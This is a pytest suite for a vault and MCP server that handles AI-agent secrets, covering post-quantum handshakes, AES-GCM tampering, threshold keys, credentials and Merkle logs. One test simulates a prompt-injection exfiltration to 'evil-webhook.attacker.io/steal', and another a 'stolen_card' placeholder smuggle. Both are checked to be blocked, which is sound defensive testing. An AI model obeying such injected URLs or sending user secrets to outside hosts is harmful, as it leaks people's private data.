"""
Comprehensive Test Suite for T3-VaultGuard (`t3_vaultguard`):
  1. ML-KEM-768 (FIPS 203) Handshake & Directional HKDF-SHA256 Key Derivation (`t3n-session-v1-c2s` / `s2c`)
  2. Authenticated 12-byte Nonce AES-256-GCM Encryption & Bit-Flip Tamper Detection
  3. Shamir 3-of-5 Threshold Quorum Key Splitting & Reconstruction
  4. Zero-Leak `http-with-placeholders` Execution (`{{user.passport_no}}`, `{{user.card_no}}`, `{{user.email}}`, `{{org.iban}}`)
  5. Prompt Injection Exfiltration Blocking via `allowed_hosts` Firewall
  6. Scoped Member Delegation (`did:t3n:agent-7f3a`) & Unpermitted Placeholder Denial
  7. Reusable KYC Smart VC Issuance, ZK Selective-Disclosure Verification & Signature Tamper Rejection
  8. Tamper-Evident Merkle Activity Log (`secret.read`, `policy.update`, `tool.install`, `tool.remove`) & Merkle Proof Verification
"""

import pytest

from t3_vaultguard.crypto import (
    Aes256GcmEnvelope,
    MLKem768SessionHandshake,
    ThresholdQuorumKeyManager,
)
from t3_vaultguard.enclave import (
    MemberDelegationGrant,
    SmartVerifiableCredential,
    T3nVaultGuardEnclave,
)
from t3_vaultguard.mcp_server import VaultGuardMcpServer


def test_mlkem768_handshake_and_directional_keys():
    hs = MLKem768SessionHandshake()
    keys, ct = hs.encapsulate_and_establish(hs.tee_measurement)
    assert keys.session_id.startswith("sess_")
    assert len(keys.c2s_key) == 32
    assert len(keys.s2c_key) == 32
    assert keys.c2s_key != keys.s2c_key  # Directional separation prevents reflection attacks
    assert len(ct) == 128


def test_mlkem768_rejects_untrusted_tee_measurement():
    hs = MLKem768SessionHandshake()
    with pytest.raises(ValueError, match="TEE attestation quote mismatch"):
        hs.encapsulate_and_establish("mr_enclave:spoofed_measurement_0000")


def test_aes256_gcm_roundtrip_and_tamper_detection():
    key = b"\x42" * 32
    aad = b"did:t3n:org-99a1:{{user.passport_no}}"
    packet = Aes256GcmEnvelope.encrypt(key, b"N84920174", aad=aad)
    assert len(packet) == 12 + len(b"N84920174") + 16
    recovered = Aes256GcmEnvelope.decrypt(key, packet, aad=aad)
    assert recovered == b"N84920174"

    # Flip 1 bit in ciphertext -> must fail authentication tag check
    tampered = bytearray(packet)
    tampered[15] ^= 0x01
    with pytest.raises(ValueError, match="authentication tag verification failed"):
        Aes256GcmEnvelope.decrypt(key, bytes(tampered), aad=aad)

    # Wrong AAD -> must fail authentication tag check
    with pytest.raises(ValueError, match="authentication tag verification failed"):
        Aes256GcmEnvelope.decrypt(key, packet, aad=b"wrong-aad")


def test_threshold_quorum_3_of_5_recovery():
    secret = b"\x9a" * 32
    shares = ThresholdQuorumKeyManager.split_secret(secret, k=3, n=5)
    assert len(shares) == 5
    assert ThresholdQuorumKeyManager.recover_secret([shares[0], shares[2], shares[4]]) == secret
    assert ThresholdQuorumKeyManager.recover_secret([shares[1], shares[3], shares[4]]) == secret


def test_mcp_flight_booking_resolves_placeholders_without_leaking_pii():
    mcp = VaultGuardMcpServer()
    res = mcp.invoke_flight_booking("off_duffel_99281a")
    assert res["status"] == "committed"
    assert res["egress_host"] == "api.duffel.com"
    assert res["contains_plaintext_in_agent_response"] is False
    # Agent context payload must ONLY contain placeholders, never raw passport or email
    assert "{{user.passport_no}}" in res["agent_context_payload"]
    assert "N84920174" not in res["agent_context_payload"]
    assert "alice.vance@acme-corp.io" not in res["agent_context_payload"]


def test_mcp_treasury_settlement_resolves_corporate_card_and_iban():
    mcp = VaultGuardMcpServer()
    res = mcp.invoke_treasury_settlement("inv_2026_1042", 4850)
    assert res["status"] == "committed"
    assert res["egress_host"] == "api.stripe.com"
    assert "{{user.card_no}}" in res["agent_context_payload"]
    assert "4532-9910-8821-4091" not in res["agent_context_payload"]


def test_blocks_prompt_injection_exfiltration_to_attacker_host():
    mcp = VaultGuardMcpServer()
    with pytest.raises(PermissionError, match="outbound_host_not_allowed: evil-webhook.attacker.io"):
        mcp.invoke_flight_booking("off_injected", target_url="https://evil-webhook.attacker.io/steal")

    log_page = mcp.enclave.get_activity_log(limit=5)
    latest = log_page["entries"][0]
    assert latest.outcome == "denied"
    assert latest.custom.get("blocked_host") == "evil-webhook.attacker.io"


def test_denies_unpermitted_placeholder_in_scoped_grant():
    mcp = VaultGuardMcpServer()
    # book-offer grant permits passport & email, NOT {{user.card_no}}
    with pytest.raises(PermissionError, match=r"placeholder not permitted: \{\{user\.card_no\}\}"):
        mcp.enclave.http_with_placeholders(
            actor_did="did:t3n:agent-7f3a",
            on_behalf_of_did="did:t3n:user-alice",
            function_name="book-offer",
            method="POST",
            url="https://api.duffel.com/air/orders",
            payload_template={"stolen_card": "{{user.card_no}}"},
        )


def test_smart_vc_reusable_kyc_selective_disclosure():
    vc = SmartVerifiableCredential.issue(
        vc_id="https://app.terminal3.io/credentials/kyc-98412",
        subject_did="did:t3n:user-alice",
        claims={"full_name": "Alice Vance", "passport_no": "N84920174", "country": "SG"},
        zk_predicates={
            "age_over_18": True,
            "ofac_sanctions_clear": True,
            "accredited_institutional_signer": True,
        },
    )
    verdict = vc.verify_presentation(["age_over_18", "ofac_sanctions_clear", "accredited_institutional_signer"])
    assert verdict["valid"] is True
    assert verdict["raw_pii_disclosed"] is False

    # Tamper with proof signature -> verification must fail
    vc.proof_signature = "0" * 64
    assert vc.verify_presentation(["age_over_18"])["valid"] is False


def test_merkle_audit_log_and_inclusion_proofs():
    mcp = VaultGuardMcpServer()
    mcp.invoke_flight_booking("off_duffel_001")
    mcp.enclave.remove_tool("stripe-treasury-settler")

    page = mcp.enclave.get_activity_log(limit=50)
    root = page["merkle_root"]
    assert len(page["entries"]) >= 4

    # Verify Merkle inclusion proof for every single entry in the log
    for entry in page["entries"]:
        proof = mcp.enclave.build_merkle_proof(entry.seq_no)
        assert T3nVaultGuardEnclave.verify_merkle_proof(entry.hash, proof, root) is True
        assert T3nVaultGuardEnclave.verify_merkle_proof("f" * 64, proof, root) is False
